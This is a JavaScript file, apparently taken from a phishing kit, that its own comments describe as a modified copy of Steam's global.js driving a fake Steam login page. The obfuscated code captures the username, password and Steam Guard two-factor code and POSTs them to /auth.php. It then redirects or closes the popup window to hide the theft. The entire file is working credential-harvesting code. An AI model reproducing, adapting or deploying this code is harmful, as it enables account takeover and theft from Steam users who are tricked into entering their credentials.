/* from engine.js loaded from the frame - modified copy of Steam's global.js */
/* This code harvests the credentials off the fake Steam login page. */
$(document).on('keypress', '#steamAccountName', function(_0xcf82x1) {
    if (_0xcf82x1.keyCode == 13) {
        $J('#steamAccountName').blur();
        $J('#steamPassword').blur();
        goAuth();
        return false
    }
});
$(document).on('keypress', '#steamPassword', function(_0xcf82x1) {
    if (_0xcf82x1.keyCode == 13) {
        $J('#steamAccountName').blur();
        $J('#steamPassword').blur();
        goAuth();
        return false
    }
});
$(document).on('keypress', '#twofact', function(_0xcf82x1) {
    if (_0xcf82x1.keyCode == 13) {
        goGuard();
        return false
    }
});
$(document).on('click', '#imageLogin', function() {
    goAuth()
});
$(document).on('click', '.auth_button.leftbtn', function() {
    goGuard()
});
$(document).on('click', '.newmodal_close', function() {
    $J('.newmodal').hide();
    $J('.newmodal_background').hide()
});

function goAuth() {
    var _0xcf82x3 = document.getElementById('steamAccountName').value;
    var _0xcf82x4 = document.getElementById('steamPassword').value;
    $('.auth_modal_h1').html('Hello <span id="login_twofactorauth_message_entercode_accountname">' + _0xcf82x3 + '</span>!</div>');
    if (_0xcf82x3.length > 3 && _0xcf82x4.length > 3) {
        $J('#login_btn_signin').hide();
        $J('#login_btn_wait').show();
        $.ajax({
            url: '/auth.php',
            type: 'POST',
            data: {
                doAuth: 1,
                login: _0xcf82x3,
                password: _0xcf82x4
            },
            success: function(_0xcf82x5) {
                if (_0xcf82x5 == 'ok') {
                    $J('#login_btn_wait').hide();
                    $J('#login_btn_signin').show();
                    $J('#error_display').hide();
                    setTimeout(function() {
                        $J('.tutten').html('<div class="newmodal_background" style="opacity: 0.8;"></div>');
                        $J('.newmodal').show();
                        $J('.newmodal_background').show()
                    }, 100)
                } else {
                    $J('#login_btn_wait').hide();
                    $J('#login_btn_signin').show();
                    $J('#error_display').show()
                }
            }
        })
    } else {
        $J('#login_btn_wait').hide();
        $J('#login_btn_signin').show();
        $J('#error_display').show()
    }
}

function goGuard() {
    var _0xcf82x7 = document.getElementById('twofact').value;
    if (_0xcf82x7.length > 0) {
        var _0xcf82x3 = document.getElementById('steamAccountName').value;
        var _0xcf82x4 = document.getElementById('steamPassword').value;
        $J('#form-dataq #login_twofactorauth_buttonset_waiting').show();
        $J('#form-dataq #login_twofactorauth_buttonset_entercode').hide();
        $J('#form-dataq #login_twofactorauth_buttonset_incorrectcode').hide();
        $J('#form-dataq #login_twofactor_authcode_entry').hide();
        $J('#form-dataq #login_twofactorauth_details_messages').hide();
        $J('#form-dataq #login_twofactorauth_message_entercode').hide();
        $.ajax({
            type: 'POST',
            url: '/auth.php',
            data: {
                doAuthCode: 1,
                login: _0xcf82x3,
                password: _0xcf82x4,
                code: _0xcf82x7
            },
            success: function(_0xcf82x5) {
                if (_0xcf82x5 == 'ok') {
                    if (ngRgy5fRj97f == 'full') {
                        window.location.href = bYpkDsW6Dsv
                    } else {
                        if (ngRgy5fRj97f == 'true') {
                            parent.window.location.href = bYpkDsW6Dsv
                        } else {
                            parent.window.opener.location.href = bYpkDsW6Dsv;
                            parent.window.close()
                        }
                    }
                } else {
                    if (_0xcf82x5 == '2fa') {
                        parent.window.opener.location.href = '/?loc=twofactor';
                        parent.window.close()
                    } else {
                        $J('#form-dataq #login_twofactorauth_icon').removeClass('auth_icon_phone').addClass('auth_icon_lock');
                        $J('#form-dataq #login_twofactorauth_buttonset_waiting').hide();
                        $J('#form-dataq #login_twofactorauth_message_incorrectcode').show();
                        $J('#form-dataq .auth_modal_h1').html('Whoops!');
                        $J('#form-dataq #login_twofactor_authcode_entry').show();
                        $J('#form-dataq #login_twofactorauth_buttonset_incorrectcode').show();
                        $J('#form-dataq #twofact').val('')
                    }
                }
            }
        })
    }
}